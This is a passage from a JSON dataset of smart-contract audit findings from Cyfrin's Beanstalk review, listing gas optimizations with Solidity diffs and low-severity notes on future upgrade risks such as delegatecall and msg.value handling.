      "content": "Currently, `LibLegacyTokenSilo:: balanceOfGrownStalkUpToStemsDeployment` [returns zero](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibLegacyTokenSilo.sol#L188) if the last update season is greater than the Stems deployment season, given this implies the account has already been credited the grown Stalk it was owed. This optimization can also be made when the last update season is equal to the Stems deployment season, as the [multiplication](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibLegacyTokenSilo.sol#L220) of the account's Seeds by a season difference of zero yields zero outstanding grown Stalk.\n\n```diff\n- if (lastUpdate > stemStartSeason) return 0;\n+ if (lastUpdate >= stemStartSeason) return 0;\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31256",
      "title": "Unnecessary reassignment of `deltaB` to its default value in `LibCurveMinting::check`",
      "impact": "GAS",
      "content": "When returning the time-weighted average `deltaB` in the BEAN/3CRV Metapool since the last Sunrise, `LibCurveMinting::check` unnecessarily reassigns `deltaB` to the default `int256` value (zero) if the Curve oracle is not initialized. Given that `deltaB` is declared in the function signature return value and is nowhere else used before this reassignment, this branch can be removed:\n\n```diff\n    if (s.co.initialized) {\n        (deltaB, ) = twaDeltaB();\n-   } else {\n-       deltaB = 0;\n    }\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31255",
      "title": "Ternary operator in `Sun::rewardToHarvestable` can be simplified",
      "impact": "GAS",
      "content": "In [`Sun::rewardToHarvestable`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L162-L172), the `newHarvestable` variable is [reassigned](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L168-L170) to `notHarvestable` if it exceeds this value, essentially acting as a cap to prevent the case where the Harvestable index exceeds the Pod index when the reward amount is sufficiently large to cause all outstanding Pods in the Pod Line to become Harvestable. If this is not the case, such that there will remain Pods in the Pod Line that are not Harvestable, reassignment is made by the ternary operator to the existing `newHarvestable` value. This branch is not necessary and can be removed:\n\n```diff\n    newHarvestable = amount.div(HARVEST_DENOMINATOR);\n-   newHarvestable = newHarvestable > notHarvestable\n-       ? notHarvestable\n-       : newHarvestable;\n+   if (newHarvestable > notHarvestable) {\n+       newHarvestable = notHarvestable;\n+   }\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31254",
      "title": "`LibTokenSilo::calculateGrownStalkAndStem` appears to perform redundant calculations on the `grownStalk` parameter",
      "impact": "GAS",
      "content": "[`LibTokenSilo::calculateGrownStalkAndStem`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L433-L441) is used in [`ConvertFacet::_depositTokensForConvert`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L209) when calculating the grown stalk to be minted and stem index at which the corresponding deposit is to be made, accounting for the current grown stalk and Bean Denominated Value (BDV). Assuming no rounding, it appears that the calculations performed on `grownStalk` are redundant:\n\n$\\text{stem} = \\text{\\_stemTipForToken} - \\frac{\\text{grownStalk}}{\\text{bdv}}$\n\n$\\text{\\_grownStalk} = (\\text{\\_stemTipForToken} - \\text{stem}) \\times \\text{bdv}$\n\n$= (\\text{\\_stemTipForToken} - (\\text{\\_stemTipForToken} - \\frac{\\text{grownStalk}}{\\text{bdv}})) \\times \\text{bdv}$\n\n$= \\frac{\\text{grownStalk}}{\\text{bdv}} \\times \\text{bdv}$\n\n$= \\text{grownStalk}$\n\n$\\therefore \\text{\\_grownStalk} \\equiv \\text{grownStalk}$\n\nIt is therefore recommended to perform the following modification:\n\n```diff\n    // LibTokenSilo.sol\n    function calculateGrownStalkAndStem(address token, uint256 grownStalk, uint256 bdv)\n        internal\n        view\n        returns (uint256 _grownStalk, int96 stem)\n    {\n        int96 _stemTipForToken = stemTipForToken(token);\n        stem = _stemTipForToken.sub(toInt96(grownStalk.div(bdv)));\n-       _grownStalk = uint256(_stemTipForToken.sub(stem).mul(toInt96(bdv)));\n+       _grownStalk = grownStalk;\n    }\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31253",
      "title": "Redundant condition in `LibSilo::_mow` can be removed",
      "impact": "GAS",
      "content": "There is a [line](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L355) within `LibSilo::_mow` which performs some validation on the last update for a given account before handling Flood logic. The account's last update must be at least equal to the season when it started \"raining\" for it to be eligible for Season of Plenty (sop) rewards. There is also additional validation that the last update is less than or equal to the current season, which will, of course, always be the case given that it is [not possible](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L372) to update an account beyond the current season. Therefore, this condition can be removed as below:\n\n```diff\n- if (lastUpdate <= s.season.rainStart && lastUpdate <= s.season.current) {\n+ if (lastUpdate <= s.season.rainStart) {\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31252",
      "title": "Extract logic for the last element when looping over Stems in `EnrootFacet::enrootDeposits`",
      "impact": "GAS",
      "content": "Currently, the `i+1 == stems.length` [condition](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L139) is checked during each iteration when looping over Stems in `EnrootFacet::enrootDeposits`. This can be modified to save gas, as shown below:\n\n```diff\n// EnrootFacet::enrootDeposits\n//...\n+       uint256 stemsLengthMinusOne = stems.length - 1;\n-       for (uint256 i; i < stems.length; ++i) {\n+       for (uint256 i; i < stems.stemsLengthMinusOne; ++i) {\n-           if (i+1 == stems.length) {\n-               // Ensure that a rounding error does not occur by using the\n-               // remainder BDV for the last Deposit.\n-               depositBdv = newTotalBdv.sub(bdvAdded);\n-           } else {\n                // depositBdv is a proportional amount of the total bdv.\n                // Cheaper than calling the BDV function multiple times.\n                depositBdv = amounts[i].mul(newTotalBdv).div(ar.tokensRemoved);\n-           }\n            LibTokenSilo.addDepositToAccount(\n                msg.sender,\n                token,\n                stems[i],\n                amounts[i],\n                depositBdv,\n                LibTokenSilo.Transfer.noEmitTransferSingle\n            );\n\n            stalkAdded = stalkAdded.add(\n                depositBdv.mul(_stalkPerBdv).add(\n                    LibSilo.stalkReward(\n                        stems[i],\n                        _lastStem,\n                        uint128(depositBdv)\n                    )\n                )\n            );\n\n            bdvAdded = bdvAdded.add(depositBdv);\n        }\n+       depositBdv = newTotalBdv.sub(bdvAdded);\n+       LibTokenSilo.addDepositToAccount(\n+           msg.sender,\n+           token,\n+           stems[stemsLengthMinusOne],\n+           amounts[stemsLengthMinusOne],\n+           depositBdv,\n+           LibTokenSilo.Transfer.noEmitTransferSingle\n+       );\n+\n+       stalkAdded = stalkAdded.add(\n+           depositBdv.mul(_stalkPerBdv).add(\n+               LibSilo.stalkReward(\n+                   stems[stemsLengthMinusOne],\n+                   _lastStem,\n+                   uint128(depositBdv)\n+               )\n+           )\n+       );\n+\n+       bdvAdded = bdvAdded.add(depositBdv);\n//...\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31251",
      "title": "Avoid repeated comparison with `msg.sender` when looping in `SiloFacet:transferDeposits`",
      "impact": "GAS",
      "content": "Currently, `SiloFacet:transferDeposits` performs the same comparison every loop iteration, but this can be done just once outside the for loop:\n\n```diff\n// SiloFacet:transferDeposits\n//...\n+       bool callerIsNotSender = sender != msg.sender;\n        for (uint256 i = 0; i < amounts.length; ++i) {\n            require(amounts[i] > 0, \"Silo: amount in array is 0\");\n-           if (sender != msg.sender) {\n+           if (callerIsNotSender) {\n                LibSiloPermit._spendDepositAllowance(sender, msg.sender, token, amounts[i]);\n            }\n        }\n//...\n```\n\nAlternatively, the logic can be divided into two separate for loops to more efficiently handle this case:\n\n```diff\n// SiloFacet:transferDeposits\n//...\n+   if (sender != msg.sender){\n        for (uint256 i = 0; i < amounts.length; ++i) {\n            require(amounts[i] > 0, \"Silo: amount in array is 0\");\n-           if (sender != msg.sender) {\n                LibSiloPermit._spendDepositAllowance(sender, msg.sender, token, amounts[i]);\n-           }\n        }\n+   } else {\n+       for (uint256 i = 0; i < amounts.length; ++i) {\n+           require(amounts[i] > 0, \"Silo: amount in array is 0\");\n+       }\n+   }\n//...\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31250",
      "title": "Avoid using `SafeMath::div` when it is not possible for the divisor to be zero",
      "impact": "GAS",
      "content": "Use of `SafeMath::div` is only necessary if the divisor can be zero. Therefore, if the divisor cannot be zero then use of this function can be avoided. The following instances have been identified where this is the case:\n\n```solidity\nFile: /beanstalk/barn/FertilizerFacet.sol\n\n45:        uint128 remaining = uint128(LibFertilizer.remainingRecapitalization().div(1e6)); // remaining <= 77_000_000 so downcasting is safe.\n\n52:        ).div(1e6)); // return value <= amount, so downcasting is safe.\n```\n\n```solidity\nFile: /beanstalk/diamond/PauseFacet.sol\n\n42:        timePassed = (timePassed.div(3600).add(1)).mul(3600);\n```\n\n```solidity\nFile: /beanstalk/field/FieldFacet.sol\n\n344:            LibDibbler.morningTemperature().div(LibDibbler.TEMPERATURE_PRECISION)\n```\n\n```solidity\nFile: /beanstalk/market/MarketFacet/Order.sol\n\n105:        uint256 costInBeans = amount.mul(o.pricePerPod).div(1000000);\n\n197:        beanAmount = beanAmount.div(1000000);\n```\n\n```solidity\nFile: /beanstalk/metadata/MetadataImage.sol\n\n167:        uint256 totalSprouts = uint256(stalkPerBDV).div(STALK_GROWTH).add(16);\n168:        uint256 numRows = uint256(totalSprouts).div(4).mod(4);\n\n596:        numStems = uint256(grownStalkPerBDV).div(STALK_GROWTH);\n597:        plots = numStems.div(16).add(1);\n```\n\n```solidity\nFile: /beanstalk/silo/SiloFacet/SiloExit.sol\n\n205:        beans = (stalk - accountStalk).div(C.STALK_PER_BEAN); // Note: SafeMath is redundant here.\n```\n\n```solidity\nFile: /beanstalk/sun/SeasonFacet/SeasonFacet.sol\n\n139:        .div(C.BLOCK_LENGTH_SECONDS);\n```\n\n```solidity\nFile: /beanstalk/sun/SeasonFacet/Sun.sol\n\n121:        uint256 maxNewFertilized = amount.div(FERTILIZER_DENOMINATOR);\n\n167:        newHarvestable = amount.div(HARVEST_DENOMINATOR);\n\n227:        uint256 newSoil = newHarvestable.mul(100).div(100 + s.w.t);\n\n229:            newSoil = newSoil.mul(SOIL_COEFFICIENT_HIGH).div(C.PRECISION); // high podrate\n\n231:            newSoil = newSoil.mul(SOIL_COEFFICIENT_LOW).div(C.PRECISION); // low podrate\n```\n\n```solidity\nFile: /ecosystem/price/CurvePrice.sol\n\n47:        rates[0] = rates[0].mul(pool.price).div(1e6);\n```\n\n```solidity\nFile: /libraries/Convert/LibMetaCurveConvert.sol\n\n36:        return balances[1].mul(C.curve3Pool().get_virtual_price()).div(1e30);\n\n86:            dy_0.sub(dy).mul(ADMIN_FEE).div(FEE_DENOMINATOR)\n```\n\n```solidity\nFile: /libraries/Curve/LibBeanMetaCurve.sol\n\n114:        balance0 = xp0.div(RATE_MULTIPLIER);\n```\n\n```solidity\nFile: /libraries/Curve/LibCurve.sol\n\n160:        xp[1] = balances[1].mul(rate).div(PRECISION);\n\n171:        xp[0] = balances[0].mul(rates[0]).div(PRECISION);\n172:        xp[1] = balances[1].mul(rates[1]).div(PRECISION);\n```\n\n```solidity\nFile: /libraries/Minting/LibMinting.sol\n\n22:        int256 maxDeltaB = int256(C.bean().totalSupply().div(MAX_DELTA_B_DENOMINATOR));\n```\n\n```solidity\nFile: /libraries/Oracle/LibChainlinkOracle.sol\n\n63:            return uint256(answer).mul(PRECISION).div(10**decimals);\n```\n\n```solidity\nFile: /libraries/Oracle/LibEthUsdOracle.sol\n\n58:            return chainlinkPrice.add(usdcPrice).div(2);\n\n68:                return chainlinkPrice.add(usdtPrice).div(2);\n\n74:                return chainlinkPrice.add(usdcPrice).div(2);\n```\n\n```solidity\nFile: /libraries/Silo/LibLegacyTokenSilo.sol\n\n143:             uint256 removedBDV = amount.mul(crateBDV).div(crateAmount);\n```\n\n```solidity\nFile: /libraries/Silo/LibSilo.sol\n\n493:                   plentyPerRoot.mul(s.a[account].sop.roots).div(\n494:                       C.SOP_PRECISION\n495:                   )\n\n\n507:               plentyPerRoot.mul(s.a[account].roots).div(\n508:                   C.SOP_PRECISION\n509:                )\n```\n\n```solidity\nFile: /libraries/Silo/LibTokenSilo.sol\n\n390:        ).div(1e6); //round here\n\n460:        int96 grownStalkPerBdv = bdv > 0 ? toInt96(grownStalk.div(bdv)) : 0;\n```\n\n```solidity\nFile: /libraries/Silo/LibUnripeSilo.sol\n\n131:            .add(legacyAmount.mul(C.initialRecap()).div(1e18));\n\n201:            .div(C.precision());\n\n246:            .div(1e18);\n\n267:        ).mul(AMOUNT_TO_BDV_BEAN_LUSD).div(C.precision());\n\n288:        ).mul(AMOUNT_TO_BDV_BEAN_3CRV).div(C.precision());\n```\n\n```solidity\nFile: /libraries/Decimal.sol\n\n228:        return self.value.div(BASE);\n```\n\n```solidity\nFile: /libraries/LibFertilizer.sol\n\n80:            newDepositedBeans = newDepositedBeans.mul(percentToFill).div(\n81:                C.precision()\n82:            );\n\n86:        uint256 newDepositedLPBeans = amount.mul(C.exploitAddLPRatio()).div(\n87:            DECIMALS\n88:        );\n\n145:            .div(DECIMALS);\n```\n\n```solidity\nFile: /libraries/LibFertilizer.sol\n\n99:            BASE_REWARD + gasCostWei.mul(beanEthPrice).div(1e18), // divide by 1e18 to convert wei to eth\n\n230:        return beans.mul(scaler).div(FRAC_EXP_PRECISION);\n```\n\n```solidity\nFile: /libraries/LibPolynomial.sol\n\n77:                positiveSum = positiveSum.add(pow(x, degree).mul(significands[degree]).div(pow(10, exponents[degree])));\n\n79:                negativeSum = negativeSum.add(pow(x, degree).mul(significands[degree]).div(pow(10, exponents[degree])));\n\n124:                positiveSum = positiveSum.add(pow(end, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));\n\n126:                positiveSum = positiveSum.sub(pow(start, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));\n\n128:                negativeSum = negativeSum.add(pow(end, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));\n\n130:                negativeSum = negativeSum.sub(pow(start, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31249",
      "title": "Duplicated logic in `Silo::_plant` when resetting the delta roots for an account",
      "impact": "GAS",
      "content": "When executing`Silo::_plant`, the delta roots of the account must be [reset to zero](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/Silo.sol#L111); otherwise, `SiloExit::_balanceOfEarnedBeans` will return an incorrect amount of beans. This logic is currently [repeated](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/Silo.sol#L127) after calling `LibTokenSilo::addDepositToAccount`, within which the delta roots of an account is not accessed, and so the redundant reassignment can be removed.\n\n```diff\n        // Silo::_plant\n        s.a[account].deltaRoots = 0; // must be 0'd, as calling balanceOfEarnedBeans would give a invalid amount of beans.\n        if (beans == 0) return (0,stemTip);\n\n        // Reduce the Silo's supply of Earned Beans.\n        // SafeCast unnecessary because beans is <= s.earnedBeans.\n        s.earnedBeans = s.earnedBeans.sub(uint128(beans));\n\n        // Deposit Earned Beans if there are any. Note that 1 Bean = 1 BDV.\n        LibTokenSilo.addDepositToAccount(\n            account,\n            C.BEAN,\n            stemTip,\n            beans, // amount\n            beans, // bdv\n            LibTokenSilo.Transfer.emitTransferSingle\n        );\n-       s.a[account].deltaRoots = 0; // must be 0'd, as calling balanceOfEarnedBeans would give a invalid amount of beans.\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31248",
      "title": "Avoid unnecessary use of `SafeMath` operations",
      "impact": "GAS",
      "content": "There are a number of instances as outlined below where the use of `SafeMath` operations can be avoided to save gas due to the fact that these values are already validated or otherwise guaranteed to not overflow:\n\n```solidity\nFile: /beanstalk/farm/TokenFacet.sol\n\n151:        currentAllowance.sub(subtractedValue)\n```\n\n```solidity\nFile: /beanstalk/market/Listing.sol\n\n194:        l.amount.sub(amount),\n\n220:        l.amount.sub(amount),\n```\n\n```solidity\nFile: /libraries/Token/LibTransfer.sol\n\n69:                token.balanceOf(address(this)).sub(beforeBalance)\n```\n\n```solidity\nFile: /libraries/Silo/LibSilo.sol\n\n264:        s.a[account].roots = s.a[account].roots.sub(roots);\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31247",
      "title": "Contract upgrades must consider that `msg.value` is persisted through `delegatecall`",
      "impact": "LOW",
      "content": "Given that `msg.value` is persisted through `delegatecall`, it is important that future contract upgrades consider the possibility of this behavior being weaponized within loops that may make unsafe use of this value. While this does not appear to be immediately exploitable, there have previously been other variants [discovered in the wild](https://samczsun.com/two-rights-might-make-a-wrong/). To reiterate, special attention must be paid to the implications of additions in any future upgrades that may introduce unsafe use of `msg.value` within loops, especially considering usage with low-level calls in the `DepotFacet`, `FarmFacet`, `Pipeline`, and `LibETH`/`LibWETH`.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31246",
      "title": "Lambda convert logic should continue to be refined",
      "impact": "LOW",
      "content": "The purpose of the `LibConvertData::ConvertKind` enum type [`LAMBDA_LAMBDA`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Convert/LibConvertData.sol#L17) is to allow the Bean Denominated Value (BDV) of a deposit to be updated without forcing the owner to first withdraw that deposit, which has the undesirable side-effect of foregoing the grown Stalk of the deposit. The token `amountIn` and `amountOut` are equal when calling [`LibLambdaConvert::convert`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Convert/LibLambdaConvert.sol#L15-L28) through [`ConvertFacet::convert`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L71), which proceeds to calculate a [new BDV](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L85) for the deposit corresponding to the existing token amount. As mentioned, this allows users to update the BDV of a deposit that is potentially stale to the downside without first withdrawing the deposit; however, by the same token, it is possible for the BDV for a deposit to be stale in such a way that its BDV is higher than it should be in reality. In this case, the user has no incentive to perform a lambda convert on their deposit because it benefits from additional seignorage than it should actually be owed given current market conditions. It is [not currently possible](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L85) for the BDV of a deposit to decrease, but it is understood that a Game Theoretic solution is intended to be implemented to allow any caller to initiate a lambda convert on the deposit of a given account that may be stale in this way. It is recommended that this solution be implemented as a temporary measure while other methods for handling this issue are explored.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31245",
      "title": "Extra attention must be paid to future contract upgrades that utilize new or otherwise modify existing low-level calls",
      "impact": "LOW",
      "content": "Care must be taken when introducing new features to Beanstalk that leverage low-level calls to ensure that they cannot be manipulated to appear as if those to functions that use `LibDiamond::enforceIsOwnerOrContract` originated from Beanstalk. This could allow a caller to circumvent this check, giving them access to privileged functions in the `UnripeFacet`, `PauseFacet`, `FundraiserFacet`, and `WhitelistFacet`.  While this does not appear to be immediately exploitable, it is important to understand that a successful exploit would require access to either an arbitrary external call within Beanstalk or a `delegateCall` in the context of Beanstalk following a low-level call in which the Beanstalk Diamond is the `msg.sender`. To reiterate, special attention must be paid to the implications of additions in any future upgrades that may introduce unsafe arbitrary external calls, especially considering usage with the `DepotFacet`, `FarmFacet`, `Pipeline`, and `LibETH`/`LibWETH`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31244",
      "title": "Inaccurate NatSpec comments in `AppStorage`",
      "impact": "LOW",
      "content": "Within the [`AppStorage::SiloSettings`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L373) struct, there is a [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L381-L385) that references the use of a `delegatecall` to calculate the Bean Denominated Value (BDV) of a token. This is incorrect – it is a [`staticcall`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L287) to the selector corresponding to any of the signatures contained within [`BDVFacet`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/BDVFacet.sol#L18) and not [`tokenToBdv`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L368C18-L368C28).\n\nOther inaccuracies are present in both the [`AppStorage::AppStorage`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L441-L550) and [`AppStorage::State`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L86-L160) structs where there are members missing from the documentation and/or documented in an order that is not reflective of the subsequent declarations. These should be checked carefully and updated accordingly for the sake of consistency and minimizing confusion.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31243",
      "title": "`Root.sol` should be updated to be compatible with recent changes to Beanstalk",
      "impact": "LOW",
      "content": "It is understood that `Root.sol` is wholly commented out due to incompatibility with more recent changes to the core Beanstalk system. This should be resolved such that the upgradeable Root contract is once again compatible with the current iteration of Beanstalk and users can interact with wrapped Silo deposits as intended.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31242",
      "title": "Shadowed `Prices` struct declaration should be resolved",
      "impact": "LOW",
      "content": "Both `P.sol` and `BeanstalkPrice` declare a `Prices` struct of similar form. The version currently residing in `P.sol` should be modified as follows in favor of that in `BeanstalkPrice` which can then be subsequently be removed:\n\n```diff\n    struct Prices {\n-       address pool;\n-       address[] tokens;\n        uint256 price;\n        uint256 liquidity;\n        int deltaB;\n        P.Pool[] ps;\n    }\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31241",
      "title": "`Depot` is missing functions present in on-chain deployment",
      "impact": "LOW",
      "content": "The `Depot` contract is already [deployed](https://etherscan.io/address/0xDEb0f00071497a5cc9b4A6B96068277e57A82Ae2) and in use; however, this deployed version contains `receive` and `version` functions that are missing from the contract at the current commit hash. It is understood that the contract was updated and these functions were added in a more recent commit.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31240",
      "title": "Legacy withdrawal queue logic in `Weather::handleRain` should be updated",
      "impact": "LOW",
